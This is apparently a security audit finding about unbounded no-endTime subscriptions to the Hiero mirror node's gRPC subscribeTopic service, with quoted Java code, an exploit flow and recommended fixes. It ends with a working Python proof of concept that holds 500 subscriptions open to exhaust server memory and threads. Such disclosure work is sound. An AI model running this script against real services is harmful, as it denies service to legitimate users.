### Title
Unbounded Persistent Listener Accumulation via No-EndTime gRPC Topic Subscriptions

### Summary
Any unprivileged caller can open arbitrarily many `subscribeTopic` calls with no `endTime` and no `limit`. When `endTime` is null, `pastEndTime()` returns `Flux.never()`, so the `takeUntilOther` termination signal never fires and `incomingMessages()` registers a listener that persists indefinitely. There is no server-side cap on total concurrent subscriptions, allowing an attacker to exhaust memory, scheduler threads, and buffer resources.

### Finding Description

**Code path:**

`subscribeTopic()` at line 72–73 merges the live stream with a termination signal from `pastEndTime()`:

```java
Flux<TopicMessage> flux = historical
    .concatWith(Flux.merge(safetyCheck, live).takeUntilOther(pastEndTime(topicContext)))
```

`pastEndTime()` at lines 123–125 explicitly returns `Flux.never()` when `endTime` is null:

```java
private Flux<Object> pastEndTime(TopicContext topicContext) {
    if (topicContext.getFilter().getEndTime() == null) {
        return Flux.never();   // ← termination signal never fires
    }
    ...
}
```

`isComplete()` in `TopicContext` at lines 203–205 also always returns `false` when `endTime` is null:

```java
boolean isComplete() {
    if (filter.getEndTime() == null) {
        return false;
    }
    ...
}
```

`incomingMessages()` at line 120 calls `topicListener.listen(newFilter)`, which in `SharedTopicListener` (line 24) allocates a per-subscriber `onBackpressureBuffer` of up to `maxBufferSize` (default 16 384 entries) and a `boundedElastic` scheduler slot:

```java
return getSharedListener(filter)
    .onBackpressureBuffer(listenerProperties.getMaxBufferSize(), BufferOverflowStrategy.ERROR)
    .publishOn(Schedulers.boundedElastic(), false, listenerProperties.getPrefetch());
```

**Root cause / failed assumption:** The design assumes clients will either supply an `endTime`, a `limit`, or disconnect voluntarily. There is no server-enforced maximum on total concurrent subscriptions, no per-IP/per-client quota, and no idle-timeout. The only per-connection guard is `maxConcurrentCallsPerConnection = 5` in `NettyProperties`, but this is trivially bypassed by opening additional connections.

**Exploit flow:**
1. Attacker opens *C* TCP connections to the gRPC endpoint.
2. On each connection, attacker issues 5 `subscribeTopic` RPCs with `startTime = now - 1ns`, `endTime = null`, `limit = 0`.
3. Each subscription enters `incomingMessages()`, calls `topicListener.listen()`, and parks indefinitely because `pastEndTime()` returns `Flux.never()`.
4. Each live subscription holds: one `TopicContext` heap object, one 16 384-slot `onBackpressureBuffer`, one `boundedElastic` thread slot, and one open gRPC stream.
5. Attacker scales *C* to exhaust available memory or scheduler threads.

**Why existing checks are insufficient:**
- `isValidStartTime()` only rejects `startTime > now`; a value of `now - 1` is accepted.
- `maxConcurrentCallsPerConnection = 5` limits calls per connection, not globally.
- `subscriberCount` is a metric gauge only — it is never compared against a threshold to reject new subscriptions.
- No authentication or rate-limiting layer is present in the service code.

### Impact Explanation
Each persistent subscription consumes a bounded-elastic thread slot and up to ~16 384 × (message size) bytes of heap. With enough connections an attacker can exhaust the JVM heap or the `boundedElastic` thread pool, causing `OutOfMemoryError` or thread starvation for all legitimate subscribers. This is a denial-of-service / griefing impact with no economic damage to network participants, consistent with the stated scope.

### Likelihood Explanation
The gRPC endpoint is publicly reachable (no authentication in the service layer). The attack requires only a standard gRPC client library and the ability to open TCP connections. It is trivially scriptable, repeatable, and requires no special knowledge beyond the public protobuf API. A single attacker machine with modest bandwidth can sustain hundreds of idle subscriptions.

### Recommendation
1. **Enforce a global (or per-IP) subscription cap** — compare `subscriberCount` against a configurable maximum before accepting a new subscription and return `RESOURCE_EXHAUSTED` if exceeded.
2. **Enforce a maximum subscription duration / idle timeout** — add a configurable `maxSubscriptionDuration` in `GrpcProperties`; apply `.timeout(maxDuration)` to the live flux unconditionally.
3. **Require `endTime` or `limit` for open-ended subscriptions** — add a validation rule in `TopicMessageFilter` or `TopicMessageServiceImpl` that rejects filters where both are absent, or cap the effective duration server-side.
4. **Rate-limit new subscription attempts per source IP** using a gRPC interceptor.

### Proof of Concept
```python
import grpc
# Assume generated stubs from the mirror node proto
from com.hedera.mirror.api.proto import consensus_service_pb2_grpc, consensus_service_pb2
import time, threading

TARGET = "mirror-node-grpc:5600"
TOPIC_ID = 1234   # any valid topic

def open_subscription():
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    req = consensus_service_pb2.ConsensusTopicQuery(
        topicID=...,
        consensusStartTime=int(time.time_ns()) - 1,
        # no consensusEndTime, no limit
    )
    for _ in stub.subscribeTopic(req):
        pass  # blocks indefinitely, holding listener open

threads = []
for _ in range(500):   # 500 persistent subscriptions
    t = threading.Thread(target=open_subscription, daemon=True)
    t.start()
    threads.append(t)

time.sleep(3600)  # hold all subscriptions open for 1 hour
```

Each thread holds one persistent `incomingMessages` listener. With 500 threads the server accumulates 500 × 16 384-slot buffers plus 500 `boundedElastic` slots, degrading or crashing the service for legitimate users. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5) [7](#0-6) [8](#0-7)

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L72-73)
```java
        Flux<TopicMessage> flux = historical
                .concatWith(Flux.merge(safetyCheck, live).takeUntilOther(pastEndTime(topicContext)))
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L108-121)
```java
    private Flux<TopicMessage> incomingMessages(TopicContext topicContext) {
        if (topicContext.isComplete()) {
            return Flux.empty();
        }

        TopicMessageFilter filter = topicContext.getFilter();
        TopicMessage last = topicContext.getLast();
        long limit =
                filter.hasLimit() ? filter.getLimit() - topicContext.getCount().get() : 0;
        long startTime = last != null ? last.getConsensusTimestamp() + 1 : filter.getStartTime();
        var newFilter = filter.toBuilder().limit(limit).startTime(startTime).build();

        return topicListener.listen(newFilter).concatMap(t -> missingMessages(topicContext, t));
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L123-126)
```java
    private Flux<Object> pastEndTime(TopicContext topicContext) {
        if (topicContext.getFilter().getEndTime() == null) {
            return Flux.never();
        }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L203-205)
```java
        boolean isComplete() {
            if (filter.getEndTime() == null) {
                return false;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/SharedTopicListener.java (L22-26)
```java
        return getSharedListener(filter)
                .doOnSubscribe(s -> log.info("Subscribing: {}", filter))
                .onBackpressureBuffer(listenerProperties.getMaxBufferSize(), BufferOverflowStrategy.ERROR)
                .publishOn(Schedulers.boundedElastic(), false, listenerProperties.getPrefetch());
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L13-14)
```java
    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/ListenerProperties.java (L22-23)
```java
    @Max(65536)
    private int maxBufferSize = 16384;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/domain/TopicMessageFilter.java (L48-51)
```java
    @AssertTrue(message = "Start time must be before the current time")
    public boolean isValidStartTime() {
        return startTime <= DomainUtils.now();
    }
```
